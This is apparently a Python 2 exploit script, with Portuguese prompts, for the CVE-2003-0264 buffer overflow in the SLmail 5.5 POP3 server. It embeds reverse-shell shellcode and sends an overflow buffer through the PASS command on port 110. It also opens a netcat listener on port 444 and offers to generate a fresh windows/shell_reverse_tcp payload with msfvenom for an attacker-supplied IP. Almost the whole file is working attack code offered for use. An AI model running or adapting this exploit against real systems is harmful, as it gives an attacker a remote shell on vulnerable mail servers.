# -*- coding: utf-8 -*-
import socket
from time import sleep
from os import system

system("clear")

print 'Shell-code-foi-informada?\r\n'

print '[1] sim'
print '[2] nao\n'

quest = int(input('>>> '))

def main():
    system("clear")
    #============================
    #--ensira-sua-shell-code-aqui

    buf =  ""
    buf += "\xb8\xaa\x62\xd3\xea\xda\xd4\xd9\x74\x24\xf4\x5e\x29"
    buf += "\xc9\xb1\x52\x31\x46\x12\x03\x46\x12\x83\x44\x9e\x31"
    buf += "\x1f\x64\xb7\x34\xe0\x94\x48\x59\x68\x71\x79\x59\x0e"
    buf += "\xf2\x2a\x69\x44\x56\xc7\x02\x08\x42\x5c\x66\x85\x65"
    buf += "\xd5\xcd\xf3\x48\xe6\x7e\xc7\xcb\x64\x7d\x14\x2b\x54"
    buf += "\x4e\x69\x2a\x91\xb3\x80\x7e\x4a\xbf\x37\x6e\xff\xf5"
    buf += "\x8b\x05\xb3\x18\x8c\xfa\x04\x1a\xbd\xad\x1f\x45\x1d"
    buf += "\x4c\xf3\xfd\x14\x56\x10\x3b\xee\xed\xe2\xb7\xf1\x27"
    buf += "\x3b\x37\x5d\x06\xf3\xca\x9f\x4f\x34\x35\xea\xb9\x46"
    buf += "\xc8\xed\x7e\x34\x16\x7b\x64\x9e\xdd\xdb\x40\x1e\x31"
    buf += "\xbd\x03\x2c\xfe\xc9\x4b\x31\x01\x1d\xe0\x4d\x8a\xa0"
    buf += "\x26\xc4\xc8\x86\xe2\x8c\x8b\xa7\xb3\x68\x7d\xd7\xa3"
    buf += "\xd2\x22\x7d\xa8\xff\x37\x0c\xf3\x97\xf4\x3d\x0b\x68"
    buf += "\x93\x36\x78\x5a\x3c\xed\x16\xd6\xb5\x2b\xe1\x19\xec"
    buf += "\x8c\x7d\xe4\x0f\xed\x54\x23\x5b\xbd\xce\x82\xe4\x56"
    buf += "\x0e\x2a\x31\xf8\x5e\x84\xea\xb9\x0e\x64\x5b\x52\x44"
    buf += "\x6b\x84\x42\x67\xa1\xad\xe9\x92\x22\x12\x45\x9c\xb3"
    buf += "\xfa\x94\x9c\xb2\x46\x11\x7a\xde\xa6\x74\xd5\x77\x5e"
    buf += "\xdd\xad\xe6\x9f\xcb\xc8\x29\x2b\xf8\x2d\xe7\xdc\x75"
    buf += "\x3d\x90\x2c\xc0\x1f\x37\x32\xfe\x37\xdb\xa1\x65\xc7"
    buf += "\x92\xd9\x31\x90\xf3\x2c\x48\x74\xee\x17\xe2\x6a\xf3"
    buf += "\xce\xcd\x2e\x28\x33\xd3\xaf\xbd\x0f\xf7\xbf\x7b\x8f"
    buf += "\xb3\xeb\xd3\xc6\x6d\x45\x92\xb0\xdf\x3f\x4c\x6e\xb6"
    buf += "\xd7\x09\x5c\x09\xa1\x15\x89\xff\x4d\xa7\x64\x46\x72"
    buf += "\x08\xe1\x4e\x0b\x74\x91\xb1\xc6\x3c\xa1\xfb\x4a\x14"
    buf += "\x2a\xa2\x1f\x24\x37\x55\xca\x6b\x4e\xd6\xfe\x13\xb5"
    buf += "\xc6\x8b\x16\xf1\x40\x60\x6b\x6a\x25\x86\xd8\x8b\x6c"


    #===========================

    print 'Exploit - CVE-2003-0264\nplatfor: windows\nPOP3 SLmail-5.5 overflow :)'
    print '\nby: - Mednic -\r\n'
    host = raw_input('Host: ')

    buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 39 + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sleep(3)
    print '\nIniciando conexão ao servidor...\n'
    sleep(2)

    try:
    	s.connect((host, 110))
    	s.recv(1024)
    except:
        print 'Conexão recusada !'
        exit()

    s.settimeout(1)
    print '\nEnviando usuario...\n'

    s.send("USER guest\r\n")
    s.recv(1024)

    s.settimeout(1)
    print '\nIniciando estouro de buffer...\n'

    system('nc -nlvp 444')

    s.send("PASS "+buffer+"\r\n")
    s.recv(1024)

    s.send("QUIT\r\n")
    s.close()

if quest == 1:
    main()

elif quest == 2:
    print "IP para conexão reversa !"
    ip = raw_input('>>> ')
    system('clear')
    system('msfvenom -p windows/shell_reverse_tcp LHOST='+ip+" LPORT=444 -b "+'\\x00\\x0a\\x0d\\x20'+" -f python")
    print '\r\nCopie e substitua pelo setado no codigo !'
else:
    print 'Invalido argumento'
    exit()